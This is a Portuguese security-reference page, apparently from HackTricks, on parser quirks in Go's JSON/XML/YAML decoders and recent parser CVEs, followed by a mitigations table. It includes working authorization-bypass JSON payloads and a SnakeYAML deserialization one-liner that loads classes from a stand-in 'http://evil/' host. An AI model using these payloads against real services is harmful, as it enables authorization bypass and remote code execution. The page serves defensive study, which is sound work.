# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

Os seguintes problemas foram detectados no JSON do Go, embora possam estar presentes em outras linguagens tamb√©m. Esses problemas foram publicados em [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

Os parsers JSON, XML e YAML do Go t√™m uma longa trilha de inconsist√™ncias e padr√µes inseguros que podem ser abusados para **bypass authentication**, **escalate privileges**, ou **exfiltrate sensitive data**.


### (Un)Marshaling Unexpected Data

O objetivo √© explorar structs que permitem a um atacante ler/escrever campos sens√≠veis (por exemplo, `IsAdmin`, `Password`).

- Struct de exemplo:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- Vulnerabilidades Comuns

1. **Missing tag** (no tag = field is still parsed by default):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **Uso incorreto de `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ‚ùå wrong
}
```
Payload:
```json
{"-": true}
```
‚úîÔ∏è Maneira correta de bloquear um campo para que n√£o seja (un)marshaled:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Diferen√ßas entre parsers

O objetivo √© contornar a autoriza√ß√£o explorando como diferentes parsers interpretam o mesmo payload de forma diferente, como em:
- CVE-2017-12635: Apache CouchDB bypass via chaves duplicadas
- 2022: Zoom 0-click RCE via inconsist√™ncia do parser XML
- GitLab 2025 SAML bypass via peculiaridades do XML


**1. Campos duplicados:**
O `encoding/json` do Go considera o **√∫ltimo** campo.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Outros parsers (por exemplo, Java‚Äôs Jackson) podem escolher o **primeiro**.

**2. Insensibilidade a mai√∫sculas/min√∫sculas:**
Go √© insens√≠vel a mai√∫sculas/min√∫sculas:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
At√© truques com Unicode funcionam:
```go
json.Unmarshal([]byte(`{"a‚Ñ™tion≈ø": "bypass"}`), &req)
```
**3. Incompatibilidade entre servi√ßos:**  
Imagine:  
- Proxy escrito em Go  
- Servi√ßo AuthZ escrito em Python

Atacante envia:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python v√™ `UserAction`, permite
- Go v√™ `AdminAction`, executa


### Confus√£o de Formato de Dados (Polyglots)

O objetivo √© explorar sistemas que misturam formatos (JSON/XML/YAML) ou que falham abertamente em caso de erros de parser como:
- **CVE-2020-16250**: HashiCorp Vault analisou JSON com um parser XML depois que o STS retornou JSON em vez de XML.

O atacante controla:
- O cabe√ßalho `Accept: application/json`
- Controle parcial do corpo JSON

O parser XML do Go o analisou **de qualquer forma** e confiou na identidade injetada.

- Payload criado:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Resultado:
- **Go JSON** parser: `Action_2` (insens√≠vel a mai√∫sculas/min√∫sculas + o √∫ltimo prevalece)
- **YAML** parser: `Action_1` (sens√≠vel a mai√∫sculas/min√∫sculas)
- **XML** parser: analisa "Action_3" dentro da string

---

## Vulnerabilidades not√°veis de parser (2023-2025)

> As seguintes falhas explor√°veis publicamente mostram que o parsing inseguro √© um problema entre v√°rias linguagens ‚Äî n√£o apenas um problema do Go.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* Afeta: `org.yaml:snakeyaml` < **2.0** (usado por Spring-Boot, Jenkins, etc.).
* Causa raiz: `new Constructor()` desserializa **classes Java arbitr√°rias**, permitindo cadeias de gadgets que culminam em execu√ß√£o remota de c√≥digo.
* One-liner PoC (abrir√° a calculadora na m√°quina vulner√°vel):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Corre√ß√£o / Mitiga√ß√£o:
1. **Atualize para ‚â•2.0** (usa `SafeLoader` por padr√£o).
2. Em vers√µes antigas, use explicitamente `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* Afeta: `libyaml` ‚â§0.2.5 (biblioteca C utilizada por muitas language bindings).
* Problema: Chamar `yaml_event_delete()` duas vezes causa um double-free que atacantes podem transformar em DoS ou, em alguns cen√°rios, heap exploitation.
* Status: Upstream rejeitou como ‚ÄúAPI misuse‚Äù, mas distribui√ß√µes Linux lan√ßaram **0.2.6** com patch que libera o ponteiro para NULL defensivamente.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* Afeta: Tencent **RapidJSON** antes do commit `8269bc2` (<1.1.0-patch-22).
* Falha: Em `GenericReader::ParseNumber()` aritm√©tica sem verifica√ß√£o permite que atacantes criem literais num√©ricos enormes que fazem wrap-around e corrompem o heap ‚Äî possibilitando, em √∫ltima inst√¢ncia, privilege-escalation quando o grafo de objetos resultante √© usado para decis√µes de autoriza√ß√£o.

---

### üîê Mitiga√ß√µes (Atualizadas)

| Risco                               | Corre√ß√£o / Recomenda√ß√£o                                   |
|-------------------------------------|------------------------------------------------------------|
| Campos desconhecidos (JSON)         | `decoder.DisallowUnknownFields()`                          |
| Campos duplicados (JSON)            | ‚ùå Sem corre√ß√£o na stdlib ‚Äî valide com [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Correspond√™ncia case-insensitive (Go) | ‚ùå Sem corre√ß√£o ‚Äî valide tags de struct + pr√©-canonicalize a entrada |
| XML garbage data / XXE              | Use um parser refor√ßado (`encoding/xml` + `DisallowDTD`)   |
| Chaves desconhecidas (YAML)         | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | Use SafeConstructor / atualize para SnakeYAML ‚â•2.0         |
| libyaml ‚â§0.2.5 double-free          | Atualize para **0.2.6** ou para a release distro-patched  |
| RapidJSON <patched commit           | Compile contra a vers√£o mais recente do RapidJSON (‚â•July 2024) |

## Veja tamb√©m

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## Refer√™ncias

- Baeldung ‚Äì ‚ÄúResolving CVE-2022-1471 With SnakeYAML 2.0‚Äù
- Ubuntu Security Tracker ‚Äì CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
